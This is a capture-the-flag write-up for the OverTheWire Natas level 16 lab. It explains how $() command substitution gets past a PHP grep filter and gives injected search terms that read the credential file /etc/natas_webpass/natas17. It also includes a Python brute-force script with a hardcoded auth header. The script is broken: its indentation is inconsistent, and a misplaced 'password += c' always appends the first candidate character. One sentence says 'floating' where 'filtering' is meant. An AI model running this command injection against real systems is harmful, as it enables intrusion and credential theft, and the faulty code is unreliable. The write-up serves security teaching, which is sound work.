### Solution

To solve this level, we first log into the natas16 application using the credentials provided above.

The application is reminiscent of [level 10](https://hchawla.github.io/2017/07/02/NatasL1011.html) which we were able to bypass using a simple grep trick. However, this time around, it seems like the application is filtering on some characters and doesn’t allow access to the passthru function if those characters are present.

```php
if($key != "") {
 if(preg_match('/[;|&`\'"]/',$key)) {
 print "Input contains an illegal character!";
 } else {
 passthru("grep -i \"$key\" dictionary.txt");
 }
}
```
The characters being filtered this time are **; | & ‘ ` "**. Moreover, unlike last time around, the user’s input is being passed within double quotes ( \”$key\” ) . Therefore, whatever the user searches for will be sent to the grep query and searched within the dictionary. Therefore, executing a query using grep seems unlikely.

To solve this issue, we make use of another one of BASH’s command line tricks. One of the ways of injecting a command within a BASH command is by using $(). Fortunately for us, all these 3 characters are still permissible to the application as the application does not filter these characters.

The $(…) form of command substitution permits nesting. You can read more about this [here](http://tldp.org/LDP/abs/html/loops1.html#BINGREP). Below is one of the examples from the web link.

```php
generate_list ()
{
 echo "one two three"
}

for word in $(generate_list) # Let "word" grab output of function.
do
 echo "$word"
done

# one
# two
# three
```

As we can see above, the command within $() is executed first and the results of that command is used to run the for loop. We can use the same concept and apply it to our learning from the previous SQL Injection problem and try to guess the password using the output of the main command.

Let’s try using the word ‘filtering’ in the search box. We can see below that the application responds with only one result. Therefore, any addition of letters to the word ‘filtering’ will cause the application to give no result at all. We can now use this knowledge similarly to the previous round. If the result of our command substitution returns nothing, the application will search for the word ‘floating’ and return the result. However, if our command substitution returns a letter back, the application will give no output.

![Natas16-2](https://securitytimes.files.wordpress.com/2017/06/6-29-2017-3-00-33-pm.png?w=663)

Let’s assume that the password for the next level is **Password**. We’ll now create our own test cases and see how the application responds:

```
Search term : $(grep a /etc/natas_webpass/natas17)filtering
 Application query : passthru("grep -i "$(grep a /etc/natas_webpass/natas17)filtering" dictionary.txt")
 Application result : NULL
```

```
Search term : $(grep b /etc/natas_webpass/natas17)filtering
 Application query : passthru("grep -i "$(grep b /etc/natas_webpass/natas17)filtering" dictionary.txt")
 Application result : filtering
```

We will create a script that does this checking for us. Like the last [level](https://securitytimes.wordpress.com/2017/06/29/natas15-16/), we hope that the password will follow the same pattern as it has for all the previous level.

```python
import urllib2
alphanumericChars='1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'
passwordChars=''
password=''
debug=0
targetURL='http://natas16.natas.labs.overthewire.org/'
passString = 'filtering'
REQ=urllib2.Request(targetURL, headers={"Authorization" : "Basic bmF0YXMxNjpXYUlIRWFjajYzd25OSUJST0hlcWkzcDl0MG01bmhtaA=="})
try:
    contents = urllib2.urlopen(REQ).read()
   if debug:
        print contents
except urllib2.HTTPError as e:
    print e.code
     print e.read()

def findPassChars():
    global debug, passwordChars, targetURL, passString
    for c in alphanumericChars:
        completeURL=targetURL + '?needle=%24(grep+' + c + '+%2Fetc%2Fnatas_webpass%2Fnatas17)filtering&submit=Search'
        REQ=urllib2.Request(completeURL, headers={"Authorization" : "Basic bmF0YXMxNjpXYUlIRWFjajYzd25OSUJST0hlcWkzcDl0MG01bmhtaA=="})
        contents = urllib2.urlopen(REQ).read()
        if contents.find(passString)==-1:
            passwordChars += c
            print 'Password contains character     :    ' + c
            if debug:
                print contents

def findPassword():
    global debug, passwordChars, targetURL, password
    for i in range(32):
         for c in passwordChars:
             completeURL=targetURL + '?needle=%24(grep+^' + password + c + '+%2Fetc%2Fnatas_webpass%2Fnatas17)filtering&submit=Search'
             REQ=urllib2.Request(completeURL, headers={"Authorization" : "Basic bmF0YXMxNjpXYUlIRWFjajYzd25OSUJST0hlcWkzcDl0MG01bmhtaA=="})
             contents = urllib2.urlopen(REQ).read()
             if contents.find(passString)==-1:
                 if debug:
                     print contents
             password += c
             print 'Current password evaluation:' + password
             break
print password

findPassChars()
findPassword()
```

By using the above python code, we can first find out the characters in the password and then by using a simple grep technique, we can find out the position of the characters within the password.
